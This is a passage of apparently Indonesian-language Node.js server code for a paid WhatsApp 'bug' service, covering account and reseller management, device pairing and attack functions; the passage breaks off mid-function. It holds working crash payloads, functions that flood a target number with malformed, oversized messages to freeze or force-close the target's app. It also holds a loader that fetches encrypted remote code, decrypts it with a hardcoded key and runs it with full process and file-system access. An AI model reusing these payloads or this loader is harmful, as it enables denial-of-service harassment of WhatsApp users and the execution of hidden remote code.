    return res.status(403).json({ valid: false, error: "Hanya owner yang bisa menghapus global sender." });
  }

  const cleanNumber = String(number).replace(/\D/g, '');

  if (globalConnections[cleanNumber]) {
    try { globalConnections[cleanNumber].ws.close(); } catch (e) { }
    delete globalConnections[cleanNumber];
  }

  const sessionDir = path.join('permenmd', 'global', cleanNumber);
  if (fs.existsSync(sessionDir)) fs.rmSync(sessionDir, { recursive: true, force: true });

  const senders = loadGlobalSenders().filter(s => s.number !== cleanNumber);
  saveGlobalSenders(senders);

  console.log(`[🌐 GLOBAL] Sender ${cleanNumber} dihapus oleh ${user.username}`);
  return res.json({ valid: true, message: `Global sender ${censorNumber(cleanNumber)} berhasil dihapus.` });
});
// ============================================================

app.get("/getPairing", async (req, res) => {
  const { key, number } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ BUG] Key tidak valid.");
    return res.json({ valid: false });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!keyInfo) return res.status(401).json({ error: "Invalid session key" });

  if (!number) return res.status(400).json({ error: "Number is required" });

  try {
  const sessionDir = path.join('permenmd', user.username, number); 

  if (!fs.existsSync(`permenmd/${user.username}`)) fs.mkdirSync(`permenmd/${user.username}`);
  if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir);

  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
  const { version } = await fetchLatestBaileysVersion();

  const sock = makeWASocket({
      auth: state,
      printQRInTerminal: false,
      logger: pino({ level: "silent" }),
      version: version,
      defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("creds.update", saveCreds);

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;
    if (connection === "close") {
      const isLoggedOut = lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut;
      if (!isLoggedOut) {
        console.log(`🔄 Reconnecting ${number}...`);
        await waiting(3000);
        await pairingWa(number, user.username);
      } else {
        delete activeConnections[number];
      }
    }
  });

  if (!sock.authState.creds.registered) {
    await waiting(1000);
    let code = await sock.requestPairingCode(number);
    console.log(code);
    if (code) {
      return res.json({ valid: true, number, pairingCode: code });
    } else {
      return res.json({ valid: false, message: "Already registered or failed to get code" });
    }
  }
  } catch (err) {
    return res.status(500).json({ error: err.message });
  }
});

app.get("/createAccount", (req, res) => {
  const { key, newUser, pass, day } = req.query;
  console.log(`[👤 CREATE] Request create user '${newUser}' dengan key '${key}'`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ CREATE] Key tidak valid.");
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabase();
  const creator = db.find(u => u.username === keyInfo.username);

  if (!creator || !["reseller", "owner", "reseller1"].includes(creator.role)) {
    console.log(`[❌ CREATE] ${creator?.username || "Unknown"} tidak memiliki izin.`);
    return res.json({ valid: true, authorized: false, message: "Not authorized." });
  }

  if (creator.role === "reseller" && parseInt(day) > 30) {
    console.log("[❌ CREATE] Reseller tidak boleh membuat akun lebih dari 30 hari.");
    return res.json({ valid: true, created: false, invalidDay: true, message: "Reseller can only create accounts up to 30 days." });
  }

  if (db.find(u => u.username === newUser)) {
    console.log("[❌ CREATE] Username sudah digunakan.");
    return res.json({ valid: true, created: false, message: "Username already exists." });
  }

  const expired = new Date();
  expired.setDate(expired.getDate() + parseInt(day));

  const newAccount = {
    username: newUser,
    password: pass,
    expiredDate: expired.toISOString().split("T")[0],
    role: "member",
  };

  db.push(newAccount);
  saveDatabase(db);
    
  sendToGroups(
    `✅ *Akun Baru Dibuat*\nUsername: ${newAccount.username}\nDibuat Oleh: ${creator.username}\nDurasi: ${day} hari\nRole: ${newAccount.role}`,
    { parse_mode: "Markdown" }
  );

  console.log("[✅ CREATE] Akun berhasil dibuat:", newAccount);
  const logLine = `${creator.username} Created ${newUser} duration ${day}\n`;
  fs.appendFileSync('logUser.txt', logLine);

  return res.json({ valid: true, created: true, user: newAccount });
});

app.get("/deleteUser", (req, res) => {
  const { key, username } = req.query;
  console.log(`[🗑️ DELETE] Request hapus user '${username}' oleh key '${key}'`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ DELETE] Key tidak valid.");
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabase();
  const admin = db.find(u => u.username === keyInfo.username);

  if (!admin || admin.role !== "owner") {
    console.log(`[❌ DELETE] ${admin?.username || "Unknown"} bukan owner.`);
    return res.json({ valid: true, authorized: false, message: "Only owner can delete users." });
  }

  const index = db.findIndex(u => u.username === username);
  if (index === -1) {
    console.log("[❌ DELETE] User tidak ditemukan.");
    return res.json({ valid: true, deleted: false, message: "User not found." });
  }

  const deletedUser = db[index];
  db.splice(index, 1);
  saveDatabase(db);
    
  sendToGroups(
    `🗑️ *Akun Dihpus*\nUsername: ${deletedUser.username}\nDihapus Oleh: ${admin.username}\nRole: ${deletedUser.role}`,
    { parse_mode: "Markdown" }
  );
    
  const logLine = `${admin.username} Deleted ${deletedUser}\n`;
  fs.appendFileSync('logUser.txt', logLine);

  console.log("[✅ DELETE] User berhasil dihapus:", deletedUser);
  return res.json({ valid: true, deleted: true, user: deletedUser });
});

app.get('/ping', (req, res) => {
  res.send('pong');
});

app.get("/listUsers", (req, res) => {
  const { key } = req.query;
  console.log(`[📋 LIST] Request lihat semua user oleh key '${key}'`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ LIST] Key tidak valid.");
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabase();
  const admin = db.find(u => u.username === keyInfo.username);

  if (!admin || admin.role !== "owner") {
    console.log(`[❌ LIST] ${admin?.username || "Unknown"} bukan owner.`);
    return res.json({ valid: true, authorized: false, message: "Only owner can view users." });
  }

  const users = db.map(u => ({
    username: u.username,
    expiredDate: u.expiredDate,
    role: u.role || "member",
  }));

  return res.json({ valid: true, authorized: true, users });
});

app.get("/userAdd", (req, res) => {
  const { key, username, password, role, day } = req.query;
  console.log(`[➕ USERADD] ${username} dengan role ${role} oleh key ${key}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const creator = db.find(u => u.username === keyInfo.username);

  if (!creator || creator.role !== "owner") {
    console.log("[❌ USERADD] Tidak diizinkan.");
    return res.json({ valid: true, authorized: false, message: "Only owner can add user with role." });
  }

  if (db.find(u => u.username === username)) {
    console.log("[❌ USERADD] Username sudah ada.");
    return res.json({ valid: true, created: false, message: "Username already exists." });
  }

  const expired = new Date();
  expired.setDate(expired.getDate() + parseInt(day));

  const newUser = {
    username,
    password,
    role: role || "member",
    expiredDate: expired.toISOString().split("T")[0],
  };

  db.push(newUser);
  saveDatabase(db);
    
  sendToGroups(
    `✅ *Akun Baru Dibuat*\nUsername: ${newUser.username}\nDibuat Oleh: ${creator.username}\nDurasi: ${day} hari\nRole: ${newUser.role}`,
    { parse_mode: "Markdown" }
  );

  const logLine = `${creator.username} Created ${newUser} Role ${role} Days ${day}\n`;
  fs.appendFileSync('logUser.txt', logLine);
  console.log("[✅ USERADD] User berhasil dibuat:", newUser);
  return res.json({ valid: true, authorized: true, created: true, user: newUser });
});

app.get("/editUser", (req, res) => {
  const { key, username, addDays } = req.query;
  console.log(`[🛠️ EDIT] Tambah masa aktif ${username} +${addDays} hari oleh key ${key}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const editor = db.find(u => u.username === keyInfo.username);

  if (!editor || !["reseller", "owner"].includes(editor.role)) {
    console.log("[❌ EDIT] Tidak diizinkan.");
    return res.json({ valid: true, authorized: false, message: "Only reseller or owner can edit user." });
  }

  if (editor.role === "reseller" && parseInt(addDays) > 30) {
    console.log("[❌ EDIT] Reseller tidak boleh menambah lebih dari 30 hari.");
    return res.json({ valid: true, created: false, invalidDay: true, message: "Reseller can only add up to 30 days." });
  }

  const targetUser = db.find(u => u.username === username);
  if (!targetUser) {
    console.log("[❌ EDIT] User tidak ditemukan.");
    return res.json({ valid: true, edited: false, message: "User not found." });
  }

  if (editor.role === "reseller" && targetUser.role !== "member") {
    console.log("[❌ EDIT] Reseller hanya bisa mengedit user dengan role 'member'.");
    return res.json({ valid: true, edited: false, message: "Reseller hanya bisa mengedit user dengan role 'member'." });
  }

  const currentDate = new Date(targetUser.expiredDate);
  currentDate.setDate(currentDate.getDate() + parseInt(addDays));
  targetUser.expiredDate = currentDate.toISOString().split("T")[0];

  saveDatabase(db);
  const logLine = `${editor.username} Edited ${targetUser} Add Days ${addDays}\n`;
  fs.appendFileSync('logUser.txt', logLine);
  console.log("[✅ EDIT] Masa aktif diperbarui:", targetUser);
  return res.json({ valid: true, authorized: true, edited: true, user: targetUser });
});

app.get("/getLog", (req, res) => {
  const { key } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);

  if (!user || user.role !== "owner") {
    return res.json({ valid: true, authorized: false, message: "Access denied." });
  }

  try {
    const logContent = fs.readFileSync("logUser.txt", "utf8");
    return res.json({ valid: true, authorized: true, logs: logContent });
  } catch (err) {
    return res.json({ valid: true, authorized: true, logs: "", error: "Failed to read log file." });
  }
});

const PeG74e4HR5 = 'LgNv9KRt@Wp3^YzXMh#du7P$BqZoVFE54CxLA!itM%knUpRbOYJa$GcmX^T2wQleLgNv9KRt@Wp3^YzXMh#du7P$BqZoVFE54CxLA!itM%knUpRbOYJa$GcmX^T2wQle';

async function importFromRawEncrypted(url) {
  try {
    const { data } = await axios.get(url, { responseType: 'text' });
    const [ivB64, encryptedB64] = data.trim().split('.');

    const IV = Buffer.from(ivB64, 'base64');
    const KEY = crypto.createHash('sha256').update(PeG74e4HR5).digest();

    const decipher = crypto.createDecipheriv('aes-256-cbc', KEY, IV);
    let decrypted = decipher.update(encryptedB64, 'base64', 'utf8');
    decrypted += decipher.final('utf8');

    const context = {
      module: { exports: {} },
      require,
      console,
      process,
      Buffer,
      setTimeout,
      setInterval,
      clearInterval,
      crypto,
      proto,
      generateWAMessageFromContent,
      prepareWAMessageMedia,
      generateWAMessageContent,
      generateWAMessage,
      waUploadToServer,
      fs,
      generateRandomMessageId
    };

    const sandbox = vm.createContext(context);
    sandbox.globalThis = sandbox;
    sandbox.exports = sandbox.module.exports;

    const script = new vm.Script(decrypted, { filename: 'fangsyon.js' });
    script.runInContext(sandbox);

    return sandbox.module.exports;
  } catch (err) {
    console.error("❌ Gagal decrypt & import:", err.stack || err.message);
    return null;
  }
}

let bugWa;

//cnxiv
async function VnXBlank(sock, target) {
  const msg = {
    newsletterAdminInviteMessage: {
      newsletterJid: "123456789@newsletter",
      inviteCode: "𑜦𑜠".repeat(120000),
      inviteExpiration: 99999999999,
      newsletterName: "ោ៝" + "ꦾ".repeat(250000),
      body: {
        text: "VnX Is Here" + "ી".repeat(250000)
      },
    },
  };

    await sock.relayMessage(target, msg, { });

  }
async function VnXBlankHard(sock, target) {
  await sock.relayMessage(target, {
    extendedTextMessage: {
      text: "🦠⃟꙰ ҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉🦠⃟꙰ Y A N Z ✶⤻꙳‌‌༑ᐧ‌⌁⃰   𝐕 𝐍 𝐗🍷 𝐊‌𝐈‌᪳𝐋𝐋⃪ ▾ ༑‌⟆" + "ꦾ".repeat(900000) + "\u0000".repeat(500000),
      paymentLinkMetadata: {
        button: {
          displayText: "ꦾ࣯࣯".repeat(700000),
          amount: 999999999999999999,
          currency: "💀".repeat(5000)
        },
        header: {
          headerType: 1,
          title: "x".repeat(100000),
          subtitle: "\u0000".repeat(60000),
          thumbnail: Buffer.from("ffd8".repeat(100000), "hex")
        },
        provider: {
          name: "y".repeat(80000),
          paramsJson: "{".repeat(200000),
          signature: "z".repeat(50000),
          merchantJid: "0@s.whatsapp.net"
        },
        product: {
          id: "a".repeat(100000),
          name: "b".repeat(80000),
          description: "c".repeat(90000),
          image: {
            url: "https://mmg.whatsapp.net/d/" + "d".repeat(100000),
            mimetype: "image/jpeg",
            fileSha256: "e".repeat(500),
            fileLength: "99999999999999999999",
            height: 999999999999,
            width: 999999999999,
            mediaKey: "f".repeat(500),
            fileEncSha256: "g".repeat(500),
            directPath: "/v/" + "h".repeat(100000),
            jpegThumbnail: Buffer.from("00".repeat(200000), "hex")
          }
        },
        requestId: "i".repeat(100000),
        status: 2,
        usePlayer: true,
        playerVersion: "99999.99999"
      },
      contextInfo: {
        remoteJid: "X",
        participant: "@s.whatsapp.net",
        stanzaId: "j".repeat(100000),
        mentionedJid: Array(20000).fill("0@s.whatsapp.net")
      }
    }
  }, { participant: { jid: target }, messageId: sock.generateMessageTag() });
}

async function Boom(sock, target) {
const push = [];
  const buttons = [];

  for (let r = 0; r < 50; r++) {
    buttons.push(
      {
        name: "galaxy_message",
        buttonParamsJson: JSON.stringify({
          icon: "DOCUMENT",
          flow_cta: "ꦽ".repeat(10000) + "𑜦𑜠".repeat(15000),
          flow_message_version: "3"
        })
      },
      {
        name: "cta_call",
        buttonParamsJson: JSON.stringify({
          display_text: "ꦽ".repeat(10000) + "𑜦𑜠".repeat(15000)
        })
      },
      {
        name: "cta_url",
        buttonParamsJson: JSON.stringify({
          display_text: "ꦽ".repeat(10000) + "𑜦𑜠".repeat(15000),
          url: "https://mmg.whatsapp.net",
          merchantUrl: "t.me/TheWolKerz"
        })
      },
      {
        name: "cta_copy",
        buttonParamsJson: JSON.stringify({
          display_text: "ꦽ".repeat(10000) + "𑜦𑜠".repeat(15000)
        })
      }
    );
  }

  var Rusz = generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: null,
              locationMessage: {
                degreesLatitude: 1e15,
                degreesLongitude: 1e15,
                name: "WolKer",
                address: "ꦾ".repeat(20000)
              },
              hasMediaAttachment: true
            },
            body: {
              text: "\n"
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
              buttons: buttons
            },
            contextInfo: {
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from({ length: 1900 }, () =>
                  "1" +
                  Math.floor(Math.random() * 50000000) +
                  "0@s.whatsapp.net"
                )
              ],
              isForwarded: true,
              forwardingScore: 999,
              businessMessageForwardInfo: {
                businessOwnerJid: target
              },
              quotedMessage: {
                paymentInviteMessage: {
                  serviceType: 3,
                  expiryTimeStamp: Date.now() + 1814400000
                }
              }
            }
          }
        }
      }
    },
    {}
  );

  await sock.relayMessage(target, wolker.message, {
    messageId: wolker.key.id,
    participant: { jid: target }
  });
}

async function xxx(sock, target) {
    
    const msg2 = {
        interactiveMessage: {
            header: {
                title: "WolKerz?",
                },
            body: {},
            footer: {
                text: "WolKerz!",
                hasMediaAttachment: true,
      audioMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7114-24/553151991_818685271268692_6795957783606894464_n.enc?ccb=11-4&oh=01_Q5Aa4AHdygHdhtAMHQB0P7fDG2jGlUkQfSzCPw4NPnWbiF8eKQ&oe=69E640DB&_nc_sid=5e03e0&mms3=true",
      mimetype: "audio/mp4",
      fileSha256: "BAcpC1KGx40bu/FV78kBAafPjkkdj6DLVAx+B1g3avQ=",
      fileLength: "109951162777600",
      seconds: 1,
      ptt: true,
      mediaKey: "1KXHR1pvx2+y01K6Dewevx5FF5O5wfc5iE/oHIua2WY=",
      fileEncSha256: "CggqdAt0fX+QHjKnfyX2OjO1OoUXLm5WlVlv6f5aGCU=",
      directPath: "/v/t62.7114-24/553151991_818685271268692_6795957783606894464_n.enc?ccb=11-4&oh=01_Q5Aa4AHdygHdhtAMHQB0P7fDG2jGlUkQfSzCPw4NPnWbiF8eKQ&oe=69E640DB&_nc_sid=5e03e0",
      mediaKeyTimestamp: "1774107510",
      waveform: "EBAREicPEigjMkgwMDITDQ8QFBYkCwwMDAwIBAUCBScpMkNkUE1GTT1KVVk0VUVOWlUtWEk0X0o+Xh4XFxAIAQ==",
      }
    },
            nativeFlowMessage: {
                buttons: [
                    {
  name: "single_select",
  buttonParamsJson: JSON.stringify({
    title: "Iamsatz",
    sections: [
      {
        title: "",
        rows: Array.from({ length: 4 }, (_, i) => ({
          id: "\u0000".repeat(9000),
          title: "\u0000".repeat(10000)
        }))
      }
    ]
  })
},
                    {
  name: "cta_call",
  buttonParamsJson: JSON.stringify({
                  display_text: "ꦽ".repeat(150000),
                  phone_number: "\u0000".repeat(5000)
                })
}
                    ]
                },
            contextInfo: {
                remoteJid: Math.random().toString(36) + "REQUEST_LOCATION",
                quotedMessage: {
                    conversation: "WolKerz"
                    },
                }
            }
        }
         
        await sock.relayMessage(target,msg2,{
            participant: { jid: target }
            })
}

//delay
async function VnXdelayJmbd(sock, target) {
  try {
    const msg = {
      groupStatusMessageV2: {
        message: {
          stickerMessage: {
            url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
            fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
            fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
            mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
            mimetype: "image/webp",
            directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
            fileLength: 10610,
            mediaKeyTimestamp: 1775044724,
            stickerSentTs: 1775044724091,

            contextInfo: {
              isForwarded: true,
              forwardingScore: 9999999,
              pairedMediaType: 1,
              statusSourceType: 1,
              statusAttributionType: 2,

              urlTrackingMap: {
                urlTrackingMapElements: Array.from({ length: 250000 }, () => ({}))
              }
            }
          }
        }
      }
    };

    await sock.relayMessage(target, msg, {
      participant: { jid: target }
    });

    console.log("Target Is dead");

    await new Promise(r => setTimeout(r, 1500));

  } catch (err) {
    console.error("Error:", err);

    await new Promise(r => setTimeout(r, 5000));
  }
}

async function DelayFreezerXv2(sock, target) {
  try {
    const MakLo = {
      groupStatusMessageV2: {
        message: {
          imageMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7118-24/13168261_1302646577450564_6694677891444980170_n.enc",
            mimetype: "image/jpeg",
            fileSha256: Buffer.alloc(32, 0xFF),
            fileLength: "9999999999999",
            height: 1080,
            width: 1080,
            mediaKey: Buffer.alloc(32, 0x00),
            fileEncSha256: Buffer.alloc(32, 0xFF),
            directPath: "/v/t62.7118-24/13168261_1302646577450564_6694677891444980170_n.enc",
            mediaKeyTimestamp: Date.now(),
            jpegThumbnail: Buffer.alloc(70000, 0xFF),
            caption: "𑇂𑆵𑆴𑆿".repeat(15000),
            contextInfo: {
              remoteJid: Math.random().toString(36) + "@s.whatsapp.net",
              isForwarded: true,
              forwardingScore: 999,
              urlTrackingMap: {
                urlTrackingMapElements: Array.from({ length: 80000 }, (_, z) => ({
                  participant: `62${z + 899099}@s.whatsapp.net`
                }))
              }
            }
          }
        }
      }
    };

    await sock.relayMessage(target, MakLo, {
      participant: { jid: target }
    });

    console.log("#¥done targetnya udh c1#" + target);
  } catch (err) {
    console.log("Error: " + err.message);
  }
}

async function DelayJawaSumatra(sock, target) {
  let Rap = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "\u100b",
              format: "DEFAULT",
            },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\x10".repeat(9000000000),
              version: 3,
            },
            entryPointConversionSource: "call_permission_message",
          },
        },
      },
    },
    {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background:
        "#" +
        Math.floor(Math.random() * 16777215)
          .toString(16)
          .padStart(6, "99999999"),
    }
  );
  
  let Rap2 = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "DO YOU KNOW RAP? YES I RAP",
              format: "DEFAULT",
            },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              paramsJson: "\x10".repeat(9000000000),
              version: 3,
            },
            entryPointConversionSource: "call_permission_request",
          },
        },
      },
    },
    {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background:
        "#" +
        Math.floor(Math.random() * 16777215)
        .toString(16)
        .padStart(6, "99999999"),
    }
  ); 
  
  let Rap3 = {
   viewOnceMessage: {
    message: {
     messageContextInfo: {
      deviceListMetadata: {},
      deviceListMetadataVersion: 2,
     },
     interactiveMessage: {
      contextInfo: {
       mentionedJid: [target],
       isForwarded: true,
       forwardingScore: 999,
       businessMessageForwardInfo: {
        businessOwnerJid: target,
       },
      },
      body: {
       text: "Mami",
      },
      nativeFlowMessage: {
       buttons: [
        {
         name: "single_select",
         buttonParamsJson: "\u0000".repeat(9000000000),
        },
        {
         name: "call_permission_request",
         buttonParamsJson: "\u0000".repeat(9000000000),
        },
        {
         name: "mpm",
         buttonParamsJson: "\u0000".repeat(9000000000),
        },
        {
         name: "mpm",
         buttonParamsJson: "\u0000".repeat(9000000000),
        },
        
       ],
      },
     },
    },
   },
  };

  await sock.relayMessage(target, Rap3, {
   participant: { jid: target },
  });

  await sock.relayMessage(
    "status@broadcast",
    Rap.message,
    {
      messageId: Rap.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                },
              ],
            },
          ],
        },
      ],
    }
  );
  
  await sock.relayMessage(
    "status@broadcast",
    Rap2.message,
    {
      messageId: Rap2.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                },
              ],
            },
          ],
        },
      ],
    }
  );  
}

//Frezee
async function FreezeByMia(sock, target) {
  const miaMsg = {
    message: {
      groupStatusMessageV2: {
        message: {
          newsletterAdminInviteMessage: {
            newsletterJid: "01@newsletter",
            newsletterName: "ោ៝".repeat(30000),
            inviteCode: "miacntik",
            inviteExpiration: 999999999999999,
            inviteText: "queenmia",
            directAdd: true,
            contextInfo: {
              externalAdReply: {
                title: "MiaOfc",
                body: "GuaMiaJie🤭",
                mediaType: 1,
                thumbnail: Buffer.alloc(157286400, 0xFF),
                mediaUrl: "https://files.catbox.moe/b6zhmm.jpg",
                sourceUrl: "https://" + "x".repeat(10000) + ".com"
              },
              forwardingScore: 999999999,
              isForwarded: true,
              quotedMessage: {
                newsletterAdminInviteMessage: {
                  newsletterJid: "01@newsletter",
                  newsletterName: "ꦾ".repeat(20000),
                  inviteCode: "Mia",
                  inviteText: "Cntik",
                  contextInfo: {
                    externalAdReply: {
                      title: "\n".repeat(23000),
                      body: "⚘  GwMiaJie🤤—",
                      mediaType: 1,
                      thumbnail: Buffer.alloc(104857600, 0xFF)
                    },
                    mentionedJid: [target]
                  }
                }
              },
              mentionedJid: [target],
              expiration: 999999999,
              ephemeralSettingTimestamp: 999999999,
              stanzaId: "queenmia",
              urlTrackingMap: {
                urlTrackingMapElements: Array.from({ length: 500000 }, (_, z) => ({
                  participant: `62${z + 720599}@s.whatsapp.net`
                }))
              }
            }
          }
        }
      }
    }
  };
  
  await sock.relayMessage("status@broadcast", miaMsg, {
    messageId: null,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{
          tag: "to",
          attrs: { jid: target },
          content: undefined
        }]
      }]
    }]
  });
  console.log("🕊 Succesfully Sending Bugs");
}

async function FreezerXDelay(sock, target) {
  try {
    const MakLo = {
      groupStatusMessageV2: {
        message: {
          albumMessage: {
            expectedImageCount: 100,
            collectionId: "FreezerX Ngelay",
            title: "FreezerX News" + "‎".repeat(50000),
            contextInfo: {
              remoteJid: Math.random().toString(36) + "\u0000".repeat(90000),
              isForwarded: true,
              forwardingScore: 9999,
              urlTrackingMap: {
                urlTrackingMapElements: Array.from({ length: 209000 }, (_, z) => ({
                  participant: `62${z + 899099}@s.whatsapp.net`
                }))
              }
            }
          }
        }
      }
    };

    await sock.relayMessage(target, MakLo, {
      participant: { jid: target }
    });

    console.log("FreezerX succesful send to: " + target);
  } catch (err) {
    console.log(err.message);
  }
}

//forclose
async function FCBYDENIS(sock, target) {
  for (let i = 0; i < 100; i++) {
    await sock.relayMessage(target,
      {
        groupStatusMessageV2: {
          message: {
            viewOnceMessageV2: {
              message: {
                stickerMessage: {
                  "url": "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
        "fileSha256": "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
        "fileEncSha256": "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
        "mediaKey": "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
        "mimetype": "image/webp",
        "directPath": "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
        "fileLength": "10610",
        "mediaKeyTimestamp": "1775044724",
        "stickerSentTs": "1775044724091"
                }
              }
            }
          }
        }
      },
      {
        participant: { jid: target }
      }
    );
  };
  await sleep(2000)
}

async function freezeFcClick(sock, target) {
  for (let i = 0; i < 1000; i++) {
    const msg = {
      imageMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7118-24/598799587_1007391428289008_8291851315917551033_n.enc?ccb=11-4&oh=01_Q5Aa4QEecQfG2xN6_RkPXn8UtCa0fmWNTyXDBfEqsuHnx6NvRQ&oe=6A1BB373&_nc_sid=5e03e0&mms3=true",
        mimetype: "image/jpeg",
        fileSha256: "qFarb5UsIY5yngQKA6MylUxShVLYgna4T0huGHDOMrw=",
        fileLength: "149502",
        height: 1397,
        width: 1126,
        mediaKey: "5nwlQgrmasYJIgmOkI6pgZlpRCZ7Qqx04G7lMoh4SRM=",
        fileEncSha256: "XM2q+iwypSX8r4TLT+dd/oB9R2iLGuSw+nIKP9EdnSw=",
        directPath: "/v/t62.7118-24/598799587_1007391428289008_8291851315917551033_n.enc?ccb=11-4&oh=01_Q5Aa4QEecQfG2xN6_RkPXn8UtCa0fmWNTyXDBfEqsuHnx6NvRQ&oe=6A1BB373&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1777621571",
